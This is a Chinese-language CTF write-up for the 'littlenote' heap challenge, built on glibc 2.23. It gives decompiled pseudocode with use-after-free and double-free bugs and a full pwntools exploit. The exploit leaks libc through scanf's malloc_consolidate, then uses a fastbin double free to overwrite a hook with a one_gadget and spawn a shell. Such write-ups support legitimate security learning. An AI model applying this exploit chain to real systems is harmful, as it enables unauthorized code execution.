# 铁三总决赛 littlenote
## Author: Wenhuo

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>一开始以为总决赛的题目会很难。。后来竟然三题里连我都做出了两题，题目都是glibc2.23的，算是非常经典常规的题目，没有tcache，也没有内核题。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>不多说了，先来看第一题，非常简单，冲脸就是一个**UAF和double free**，要点就在于如何泄露libc地址，这里用scanf就可以很简单的做到（**输入超长字符串给scanf就可以调用malloc分配largebin造成malloc\_consolidate**），这里坑就坑在我以为任何字符串都可以Orz，后来发现**像%u,%d之类的只能传数字**，不然输啥都不会malloc largebin。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>老样子先看看IDA分析的伪代码：</font></br>

**main**
```C
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  char s; // [rsp+10h] [rbp-20h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init();
  memset(&s, 0, 0x10uLL);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, &s, 0xFuLL);
      v3 = atoi(&s);
      if ( v3 != 2 )
        break;
      shownote();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        freenote();
      }
      else
      {
        if ( v3 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid option!");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      addnote();
    }
  }
}
```

**addnote**

```C
unsigned __int64 addnote()
{
  __int64 v0; // rbx
  __int64 v1; // rbx
  char buf; // [rsp+0h] [rbp-20h]
  unsigned __int64 v4; // [rsp+8h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  if ( (unsigned __int64)notenum > 0xF )
    puts("FULL");
  v0 = notenum;
  note[v0] = (const char *)malloc(0x60uLL);
  puts("Enter your note");
  read(0, (void *)note[notenum], 0x60uLL);
  puts("Want to keep your note?");
  read(0, &buf, 7uLL);
  if ( buf == 'N' )
  {
    puts("OK,I will leave a backup note for you");
    free((void *)note[notenum]);
    v1 = notenum;
    note[v1] = (const char *)malloc(0x20uLL);
  }
  ++notenum;
  puts("Done");
  return __readfsqword(0x28u) ^ v4;
}
```

**shownote**

```C
unsigned __int64 shownote()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Which note do you want to show?");
  _isoc99_scanf("%u", &v1);
  if ( v1 < (unsigned __int64)notenum )
  {
    if ( note[v1] )
      puts(note[v1]);
    puts("Done");
  }
  else
  {
    puts("Out of bound!");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

**freenote**

```C
unsigned __int64 freenote()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Which note do you want to delete?");
  _isoc99_scanf("%u", &v1);
  if ( v1 < (unsigned __int64)notenum )
  {
    if ( note[v1] )
      free((void *)note[v1]);
    puts("Done");
  }
  else
  {
    puts("Out of bound!");
  }
  return __readfsqword(0x28u) ^ v2;
}
```


&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>所以我们只要分配一系列fastbin，然后free之，直接就有重叠堆块了，然后用malloc_consolidate就可以泄露libc地址，再利用double free就可以把指针分配到\__free_hook上去，就做完了:)</font></br>

```python
#encoding:utf-8

from pwn import *

context.log_level='debug'

#p=process('./littlenote',env={'LD_PRELOAD':'./libc.so.6'})
p = remote('202.0.1.56',40001)
elf=ELF('./libc.so.6')

free_hook=elf.symbols['__free_hook']
one_gadget=0xf0274

sd=lambda x : p.send(x)
sl=lambda x : p.sendline(x)
sla=lambda a,x : p.sendlineafter(a,x)
rv=lambda x : p.recvuntil(x)
sa=lambda a,x : p.sendafter(a,x)


def alloc(content='',is_keep='Y'):
    sla('Your choice:\n','1')
    sla('Enter your note\n',content)
    sla('Want to keep your note?\n',is_keep)

def show(index,out=0,content=''):
    sla('Your choice:\n','2')
    if out:
        sla('Which note do you want to show?\n',content)
    else:
        sla('Which note do you want to show?\n',str(index))

def dele(index):
    sla('Your choice:\n','3')
    sla('Which note do you want to delete?\n',str(index))


alloc()     # 0
alloc()     # 1
alloc()     # 2
alloc()     # 3

dele(0)
dele(1)
dele(2)

show(2)
chunk_base=u64(p.recv(6)+2*'\x00')-0x70
log.info('chunk_base:'+hex(chunk_base))

# malloc_consildate在这
# 不懂的调试看看结果
# 或者在how2pwn里找一下我记得有demo
show(0,1,'1'*0x400)

alloc()     # 4 (0)
show(4)
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4c0a
log.info('libc_base:'+hex(libc_base))

alloc()     # 5 (1)
alloc()     # 6 (2)

dele(4)
dele(1)
dele(0)

alloc(p64(libc_base+0x3c4aed))
alloc(p64(libc_base+0x3c4aed))
alloc(p64(libc_base+0x3c4aed))
alloc('a'*0x13+p64(libc_base+one_gadget))

sla('Your choice:\n','1')

p.interactive()


'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0274	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1117	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''

```
